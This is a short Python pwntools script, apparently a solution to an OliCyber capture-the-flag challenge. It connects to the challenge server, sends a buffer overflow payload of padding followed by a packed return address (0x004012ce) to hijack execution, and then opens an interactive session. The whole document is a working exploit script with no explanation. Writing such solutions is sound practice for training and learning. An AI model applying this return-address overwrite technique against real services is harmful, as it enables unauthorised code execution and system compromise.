from pwn import *

conn = remote('moreprivateclub.challs.olicyber.it', 10016)

conn.recvuntil(b"?")
var = p64(0x004012ce)
conn.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa88888888" + var)


conn.interactive()